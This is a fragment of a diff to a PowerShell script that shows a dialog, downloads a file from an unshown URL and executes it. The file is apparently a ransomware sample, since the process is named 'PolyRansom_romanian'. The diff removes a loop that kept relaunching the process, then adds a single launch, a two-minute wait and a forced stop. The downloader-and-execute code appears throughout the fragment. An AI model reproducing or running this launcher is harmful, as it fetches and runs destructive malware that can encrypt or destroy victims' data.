@@ -40,14 +40,8 @@ $form.ShowDialog()
 Start-Sleep -Seconds 60
 $webClient.DownloadFile($url, $downloadPath)
 
-function IsProcessRunning {
-    param([string]$processName)
-    return Get-Process -Name $processName -ErrorAction SilentlyContinue
-}
+Start-Process -FilePath $downloadPath
 
-while ($true) {
-    if (-not (IsProcessRunning "PolyRansom_romanian")) {
-        Start-Process -FilePath $downloadPath -Wait
-    }
-    Start-Sleep -Milliseconds 100
-}
+Start-Sleep -Seconds 120
+
+Stop-Process -Name "PolyRansom_romanian"
